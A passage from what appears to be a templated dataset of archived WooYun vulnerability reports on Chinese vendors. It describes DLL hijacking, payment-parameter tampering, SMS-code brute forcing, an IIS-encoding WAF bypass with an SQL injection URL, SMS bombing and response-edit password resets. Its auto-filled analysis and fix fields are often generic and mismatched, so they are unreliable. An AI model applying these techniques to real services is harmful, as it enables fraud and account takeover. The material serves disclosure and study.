**厂商**: 某证券软件 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 账号信息：姓名、身份证号、登录密码MD5值、手机号存储在本地login.xml文件中。手势密码、股票浏览记录等信息存储在finacing数据库中。

**POC**: 1.账户信息明文存储：登录密码MD5值解密：2.本地数据库数据：手势密码：股票信息：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0211806] 马蜂窝主站支付漏洞（1元买保险）
**厂商**: 蚂蜂窝 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: POST /insurance/ajax HTTP/1.1Host: www.mafengwo.cnProxy-Connection: keep-aliveContent-Length: 489Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Windows NT 6.3

**绕过**: 直接利用

**修复**: 服务端校验
---

---
### [wooyun-2013-036627] YY语音最新版本两处DLL劫持（系统目录DLL）
**厂商**: 广州多玩 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: YY.exe运行时会加载两个不存在的DLL文件分别为：wintab32.dll和crashreport.dllYY语音默认路径为C:\Program Files\duowan\yy\那么crashreport.dll放在YY.exe目录下，会在YY.exe运行时同时加载crashreport.dll还有系统目录下DLL加载，该路径为c:\windows\system32\wintab32.dll在系统路径放入wintab32.dll后，同样YY.exe运行时同时会加载wintab32.dll这两个DLL还完美加载运行YY.exe这两个DLL可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的！
---

---
### [wooyun-2014-084921] MTK手机变砖漏洞
**厂商**: MTK | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MTK手机申请android.permission.ACCESS_MTK_MMHW的时候会将用户加入system用户组，android.permission.ACCESS_MTK_MMHW权限在有的手机中显示为“相机和视频”权限，在有的手机中不显示。通过MTK手机的/dev/misc-sd设备可直接对固件进行读写，此设备默认属于system用户组可访问，配合前面权限申请，即可在任意app中对固件写入

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-063537] wifi万能钥匙可能导致网络存在风险
**厂商**: wifi万能钥匙 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 打开手机的wifi万能钥匙，连接到别人已经分享的wifi，连接上就可以通过路由器弱口令漏洞进入路由器控制界面，劫持DNS。

**POC**: 打开wif万能钥匙（PC、MAC、手机等万能钥匙都有这个漏洞）这个wifi是我家的，我分享了，现在假设我是蹭网者。看，连接上了进入路由器设置界面，（我事先把登陆账号密码改成了弱口令）成功进入路由器管理，下面就可以修改这个路由器的DNS了（可以说是DNS劫持）进入修改DNS页面我假设把114和谷歌的DNS当做黑客的DNS，劫持成功了。这个DNS被劫持危害不用我说了..（我是个12岁的小学生，写得不好还请大家谅解。。）谢谢观看！w我之前也提交过，现在是补充

**绕过**: 直接利用

**修复**: 在wifi万能钥匙创建删除功能，在用户使用完后自动删除此wifi密码，在使用时禁止登陆192.168.1.1等路由器设置界面等。
---

---
### [wooyun-2013-043468] 安全狗提权防护在较高权限时可绕过添加帐号防护顺利登陆服务器
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图首先就是看一下安全狗对net文件的监控 可以通过改名 绕过这个限制然后就是看一下安全狗提权防护 添加帐号失败通过直接更改管理员密码登陆 提权防护还未做到家

**POC**: 看图首先就是看一下安全狗对net文件的监控 可以通过改名 绕过这个限制然后就是看一下安全狗提权防护 添加帐号失败通过直接更改管理员密码登陆 提权防护还未做到家

**绕过**: 过滤绕过

**修复**: 管的再多一点
---

---
### [wooyun-2012-010534] 盛大乐众ROM的几个安全问题
**厂商**: 盛大网络 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先说环境。手机：Nexus S；系统：乐众ROM 1.7.27。主要对“备份助手”的同步联系人和同步日历功能做评估。潜在的安全问题如下：1. 未向用户提示、未经用户同意，首次使用该功能时，自动向SP号码106575160882发送两条短信以注册盛大账号，每条1毛钱。这是相当不标准的做法。2. 将新建的盛大账号和密码以短信方式发送给用户。攻击者如果注册一个短信的接收器，可以获取到这一初始密码。3. 以IMSI码作为唯一凭证与服务器端进行联系人和日历同步，可能产生伪造攻击。即攻击者在获得乐众ROM用户的IMSI码后，可以采用重打包做个桩、修改ROM硬编码IMSI返回值、还原通信协议等方法，以IMSI码与盛大服务器进行通信，通过验证后进行同步，从而获得用户存储在云端的数据。（注：这里的攻击方法是理论上的，我没有做实际的攻击验证。无论如何，以IMSI码作为唯一认证凭据，这个问题可以归为OWASP 

**POC**: 1. 从移动查到的发短信记录（本地没有发送提示，也没有发送记录）：2. 收到包含密码的短信：3. 以IMSI作为唯一凭据与服务器认证：4. 明文通信同步：

**绕过**: 编码绕过

**修复**: 别用这种简陋和不正规的协议，少用明文传输个人数据。如果为了考虑用户体验，用系统的账户管理啊。从郭振架构师的一次技术交流看，你们在账户、同步、备份上做了很多定制工作，怎么这个备份还自己再搞一套？
---

---
### [wooyun-2015-0115175] 一个有意思的通用windows防火墙bypass(云锁为例)
**厂商**: 云锁 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1:之前自己总结了一个帖子,内容上将waf bypass分了几个层面,其中有一个层面是web服务器层面,记得在内容上提到了iis服务器的一些trick2:IIS在对%u0011形式的内容的时候,是可以解析的,例如我的url为:http://[IP已脱敏] and(select top 1  eventname_en from eventshelp)>0我将url编码为:http://[IP已脱敏] and(s%u0065lect top 1  eventname_en from eventshelp)>0s%u0065lect的形式的时候也会被iis解析为select3:于是我先在本地搭建了一个云锁的环境,iis版本,本机使用了windows2003的环境,并

**POC**: 8：我使用%u0065访问，直接被云锁干掉了9：我使用%u0095访问，直接报错注入，出来内容了注意图片中的and中的a，也被我用同样的方式处理了。

**绕过**: 过滤绕过, 编码绕过

**修复**: 对于敏感关键字的增加过滤
---

---
### [wooyun-2015-0164434] 雨润集团微软邮件系统设计逻辑缺陷导致敏感信息泄露
**厂商**: 雨润集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 雨润集团使用的是微软企业邮件系统，在测试过程中发现微软邮件系统爆破方式或者说微软邮件系统处理用户登陆请求的过程比较不同，所以拿出来分享一下。

**POC**: 本来准备上传视频 ，无奈智商有限，不太会1、登陆首页2、微软邮件系统处理登陆请求过程分析和常规不一样，登陆请求一共有两个请求包，两个两个响应包，决定登陆是否成功：（1）、第一个请求包：POST /owa/auth/owaauth.dll HTTP/1.1Host: **.**.**.**Content-Length: 123Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgra

**绕过**: 直接利用

**修复**: 1、添加验证码2、增加锁定机制，锁定IP地址3、升级微软邮件系统
---

---
### [wooyun-2013-024929] 发送指定封包导致某游戏官方服务端崩溃
**厂商**: crossgate.com.cn | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过劫持魔力宝贝（怀旧/道具皆可）客户端发包函数，自定义发送封包（PLVUP需要为对应客户端的对应封包头）PLVUP 足够大的数 1可导致官方游戏服务端崩溃，全体玩家断线。

**POC**: 游戏服务端没有对宠物升级封包定义的宠物位置进行范围判定，可以通过一个足够大的数导致指向的内存无效从而造成segment fault，由于没有多次在官方服务端进行证据采集，所以没有图片或其他证明存在。

**绕过**: 直接利用

**修复**: 证明部分已经写得很清楚了
---

---
### [wooyun-2015-0154337] 药给力某处设计逻辑缺陷导致任意账号登陆
**厂商**: 药给力_北京思邈互联医药科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在 App 登陆的地方，看到登陆的方式只能使用手机号＋验证码的方式登陆，应该是为了最快的将应用上线吧，省去了账号管理的开发工作。输入手机号码后，收到 App 发来的验证短信。看到验证码是四位数字，而且有效期是5分钟。直接使用 Burp 抓包，看一下能不能爆破。可以看到，发出的请求返回状态都是200，且错误的验证码返回长度是1015，1W次请求5分钟之内妥妥的够了。7209的正确验证码时，返回长度是1282直接使用跑出来的验证码登陆，进入应用。赶紧把订单信息和收获地址删掉。

**POC**: 10W请求，5个线程并发，1分25秒就跑完了。没什么好证明的了。

**绕过**: 直接利用

**修复**: 很常见的问题了，看到你们新闻上写日订单都破万了，还是注意一下用户的隐私吧，毕竟订单信息里面有用户的姓名电话地址和买的药，这部分信息被人批量爬走对用户来说也不是什么好事。
---

---
### [wooyun-2013-041366] 35互联免费刷虚拟主机漏洞
**厂商**: 35互联 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 35互联逻辑漏洞，导致可免费刷虚拟主机...

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的...
---

---
### [wooyun-2013-035878] CoreCodec Inc. CoreAVC.ax控件DLL劫持漏洞
**厂商**: CoreAVC播放器 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: CoreAVC.ax(最新版本3.0.1)，在解码时会调用一个nvcuvid.dll文件，在调用该文件时没有使用全路径加载，在没有安装Nvidia显卡驱动的情况下操作系统下可能不存在该文件，对于非Nvidia显卡用户而言，除非应用程序自行带入，否则有极大可能系统下不存在该文件，而国内外许多媒体播放器或解码包都使用了该控件，并且没有附带nvcuvid.dll文件，造成用户使用播放器或解码包进行对应视频媒体播放时有可能加载视频媒体文件同目录下的nvcuvid.dll文件，恶意攻击者可以将视频媒体文件及恶意nvcuvid.dll文件打包诱骗受害者下载解压观看，导致受害者机器被控制。因受影响的应用程序太多，无法一一测试，只能统一上报。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 控制程序运行时的当前路径环境变量。
---

---
### [wooyun-2014-071990] AA云社区逻辑漏洞#1(任意重置密码)
**厂商**: aayun.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不知道怎么选厂商问题出在密码修改  老问题   4位纯数字验证码  未限制验证次数  导致爆破一会就出来了影响范围

**POC**: 不知道怎么选厂商问题出在密码修改  老问题   4位纯数字验证码  未限制验证次数  导致爆破一会就出来了影响范围

**绕过**: 直接利用

**修复**: 没礼物就给20rank
---

---
### [wooyun-2014-071471] 华云数据逻辑缺陷可导致不用一分钱开通几亿主机
**厂商**: chinac.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们先随便选一个配置...我们抓包看到那里，应该是开通时间，所以，我们可以用-来抵扣总金额因为直接开通-的主机一小时后就会因为到期而删除...所以要选个正常的来抵消...（对不起...调皮了）100年的价格只要1亿627万7000元...穷啊.成功付款

**POC**: 那个100年的开通不了于是调皮的又开了个账号，这次正常开通正常开通

**绕过**: 直接利用

**修复**: 不知道..
---

---
### [wooyun-2013-036602] 飞信2013最新版本DLL劫持
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 飞信2013默认安装路径：C:\Program Files\China Mobile\Fetion\具体利用方法：Fetion.exe运行时会加载一个不存在的DLL文件rapi.dll，只要自己写一个rapi.dll与Fetion.exe放在同一目录，这样就可以在运行Fetion.exe的时候会同时加载rapi.dll，这个rapi.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行Fetion.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！！！
---

---
### [wooyun-2013-034456] 艺龙旅行网第一弹elong售票存在支付漏洞（0元购买）
**厂商**: 艺龙旅行网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 几个外地朋友来北京玩，想去园博会看看，票价有点小贵，上艺龙转了转。有票卖，比园里便宜。习惯性的截包试了下，竟然....不多说，无图无真相，下面开始看图说话：话说提交订单后，不会立刻显示支付结果，仍然会显示“未支付”，不过过1分钟左右，再刷新就会看到订单已完成，手机收到优惠券。

**POC**: 园博会门票75-7下单，2份，价格150-14.截包，saleprice改成优惠券的价格即可，这样就可以0元。跳转到支付页面，支付金额0元。订单提交成功。上面订单提交成功以后，由于去订单页面发现提示未支付，以为没法0元，所以重新试验了一次，改成7.01.（实际订单提交有延时，后来才发现。）因为7.01*2-14=0.02.所以支付0.02订单提交成功。回到团购页，可发现订单已成功。点击查看订单，看下图。订单确实提交成功，如果手机未收到短消息，还可以选择重发短信。手机收到的截图。汇报完毕。不知道这么大一个网站，为啥还存在这样的低级漏，有点想不通。顺便测试了一下，发现贵网还有几个问题，朋友催出去吃

**绕过**: 直接利用

**修复**: 稍微加强一下逻辑验证。同时建议贵网加强自查，还有几个问题，时间问题，回头慢慢放，今天先放第一弹。
---

---
### [wooyun-2014-072632] 定位宝可定位任意客户手机号码/无限制使用/登陆任意账号(包括管理员)/可以监听手机，定位，查看对方行踪
**厂商**: dwb.so | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我自评就20吧 其实30也不为过吧？

**POC**: 某搜索引擎搜索定位宝 dwb.so第一弹没什么技术含量-.-.权限控制：发送短信/发送彩信 *询问* （我使用的手机自带的，没有的可以使用防护软件例如360，LBE安全大师...无需root）#使用任意手机号注册：随便输入手机号码，选择发送验证码。权限控制会弹出上面的框框。就可以看到验证码内容了。直接拒绝发送，输入验证码，OK登陆成功了<img结果页面#登陆用户的账号，以便获得其所在位置：登陆成功！start open GPS---定位成功！#如何获得用户的账号：加入官方群，可以询问或者社工群成员的手机号码就OK。或者社工库查找手机号码。我是直接询问的……#漏洞证明：

**绕过**: 直接利用

**修复**: So,easy!在这里我就简单的说两种方法吧：#1 如果资金允许。使用网络发信平台,例如：申请浏览https://example.com/[已脱敏] 网页形式读取手机状态IMEI或其他信息，自动生成验证码通过网络平台发送到手机。可绑定手机，实现一机一号。#2 如若资金不太充足。可以自己编写一款加密或者调
---

---
### [wooyun-2015-0106303] 网站移动版漏洞：短信轰炸＋密码爆破
**厂商**: 锦江之星旅馆有限公司 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）找回密码，短信轰炸：手机随便填，都可以发送。用上发送软件的话，可以突破1分钟的发送间隔限制。2）用户登录，验证码没有产生作用。

**POC**: 1）找回密码，短信轰炸：手机随便填，都可以发送。用上发送软件的话，可以突破1分钟的发送间隔限制。2）用户登录，验证码没有产生作用。

**绕过**: 直接利用

**修复**: 增加安全意识，保护客户隐私
---

---
### [wooyun-2013-034170] 艺龙旅行网团购逻辑存在支付漏洞可免费订房
**厂商**: 艺龙旅行网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 打开网站  有个团购打开以后点抢购然后支付方式选择信用卡，之后打开burpsuite点击提交，然后拦截数据包，修改ProductNum为-1之后forward,然后填入信息，点击提交，可以看到订单提交成功然后我们查看订单。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂。。
---

---
### [wooyun-2015-0110477] p2p金融安全之金联储某处严重逻辑漏洞(影响用户资金安全)
**厂商**: 金联储 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 日访问量近500W测试admin账户：mask 区域*****^^ad**********^^zx*****

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 有节操的白帽子，仅测试漏洞
---

---
### [wooyun-2013-036531] 某浏览器安全浏览器DLL劫持漏洞
**厂商**: 金山网络 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某浏览器安全浏览器最新版（版本4.2.25.5405），官方下载安装版本KSbrowser_4.2.25.5405.exe，windows xp sp3环境，某浏览器安全浏览器的主程序在运行中浏览某些特定网页时会加载一个位于用户数据目录下的DLL文件(%USERPROFILE%\Local Settings\Application Data\liebao\User Data\common\kcontent_factory.dll，其中common目录安装完猎豹默认没有创建，可手工创建)，用户数据目录不被猎豹的安全防御系统所保护，导致可能被恶意攻击者利用进入其进程空间实现提权及其它恶意行为。测试发现对以前的版本同样有效。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂商懂得。
---

---
### [wooyun-2012-012866] 驴妈妈旅游网严重支付漏洞
**厂商**: 驴妈妈旅游网 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1·这是一个普通的订单：2·然后还是抓包修改价格参数3·然后的情况就知道了

**POC**: 没有支付，如果有人工审核应该会过滤这样的订单的。希望你们有，也希望你们诚实。

**绕过**: 直接利用

**修复**: 最简单一条：好好保护好价格、数量这样的参数ALL
---

---
### [wooyun-2015-0144617] 某证券软件手机客户端账号登录密码MD5值SDcard目录下明文存储
**厂商**: 某证券软件 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某证券软件 Android客户端 账户信息明文存储在SDcard目录文件中，任何应用只要有读写sdcard权限，都可读取某证券软件客户端存储的账户信息。

**POC**: 被测Android客户端下载地址：http://**.**.**.**/apk  : com.hexin.plat.android, 4205, V9.10.02, 某证券软件apkmd5: 6a2abaeb771557de489681187b1ffb8d证书 :certmd5: 110582f43caed505854599c7ada28e77issuer: C=CN, ST=ZheJiang, L=Hangzhou, O=ShouJiKaiFaZu, OU=TongHuaShun, CN=hexinsubject: C=CN, ST=ZheJiang, L=Hangzhou, O=ShouJiK

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120632] 263企业会议逻辑缺陷（可控制任意视频会议）
**厂商**: 263通信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 263视频会议开始一个视频会议，抓包有如下请求：http://[IP已脱敏]

**POC**: 已证明。

**绕过**: 直接利用

**修复**: ~~
---

---
### [wooyun-2015-0151136] 爱回收某处存在设计逻辑缺陷
**厂商**: 爱回收网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱回收用户订单中心可通过手机号遍历所有用户,直接进入用户中心抓包,得到POST体为:mobile=13000000469&captcha=111111burpsuite遍历mobile字段,跑出用户,进入用户中心

**POC**: 上图中包长度为260的代表跑成功的手机号通过手机号登录用户中心

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0148978] 首汽集团分站设计逻辑缺陷可撞库
**厂商**: 首汽约车 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 再多的账号就没弄了
---

---
### [wooyun-2015-0158771] 某互联网公司群无视群设置群管理员限制
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一步：进入需要设置群管理的群（群主操作）点击群资料（这里显示群管理设置只能是10个人）第二步：点击高级管理进入网页第三步：需要弄管理的成员都给打上勾，然后就点击上方的“设置管理员”

**POC**: 如图

**绕过**: 直接利用

**修复**: 设置时再进行一次验证
---

---
### [wooyun-2013-035369] 快播QvodPlayer最新版DLL劫持漏洞（已给出利用方法）
**厂商**: 快播 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 快播QvodPlayer（版本5,15,144,0），安装程序为官网离线版QvodSetupPlus5.exe，windows xp sp3环境，qvodplayer运行时会试图加载一个不带路径的nvcuvid.dll文件，如果在音视频文件目录下放置一个恶意的nvcuvid.dll文件，当用户双击打开该音视频文件时，恶意DLL即被加载触发，危害性不用说了吧。

**POC**: null

**绕过**: 直接利用

**修复**: 带全路径加载。
---

---
### [wooyun-2013-039132] 迅雷下载客户端某处dll hijack
**厂商**: 迅雷 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 就是kernnelbase.dll和.torrent文件放一起，打开torrent文件触发，后果你懂的，这个影响有点恐怖。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂
---

---
### [wooyun-2015-0119071] 豆瓣某处逻辑漏洞
**厂商**: 豆瓣 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 收货地址没有验证

**POC**: 改为4680在查看该订单address_id=4621

**绕过**: 直接利用

**修复**: 权限认证
---

---
### [wooyun-2015-0164699]  吉象吉送某处设计逻辑缺陷导致任意密码修改
**厂商**: 吉象吉送 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: app下载地址：http://**.**.**.**/16891/5ABBC04AAF2EC7C33915ADE4AAA9BA11.apk?fsname=com.xiangyu.mall_V2.3.2_70.apkapp详情：com.xiangyu.mall_V2.3.2_70.apkapk  : com.xiangyu.mall, 70, V2.3.2, 吉象吉送apkmd5: 5abbc04aaf2ec7c33915ade4aaa9ba11证书 :certmd5: 80206f3ecbfcf1c48dc62f1e167bc92dissuer: C=zh, ST=fujiansheng, L=xiamenshi, O=xiangyu, OU=xiangyudianshang, CN=chenyanmosubject: C=zh, ST=fujiansheng, L=xiamenshi, 

**POC**: 参考：http://**.**.**.**/bugs/wooyun-2015-01533461、密码找回，任意输入验证码。2、将服务器返回的04修改为00，即可绕过验证码。3、之后正常修改密码，可登录账号。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085442] 某运营商某省管理系统逻辑漏洞
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0136225] 时趣互动某重要系统逻辑缺陷(员工通讯录/名人某社交平台/各个内部系统)
**厂商**: social-touch.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 时趣OA系统，登录处没有验证码。https://example.com/[已脱敏]

**POC**: KOL用户列表，大量名人某社交平台（王珞丹,李冰冰，张杰，，，，）

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0110567] p2p金融安全之808信贷某严重逻辑漏洞(影响用户资金安全)
**厂商**: 808信贷 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 808信贷，互联网金融行业 Top 100 ，排名第二十七成交总额：￥4,493,853,525.15为投资人创造收益：￥201,342,907.30用户量也是很多啊，不同于一般小的信贷，求个好点礼物如何？下面进入神器的漏洞复现与实际利用过程注册个账号，先成为了你们的用户，呵呵，虽然屌丝。然后找回密码，居然收件是这样一个奇葩的重置密码链接https://example.com/[已脱敏]

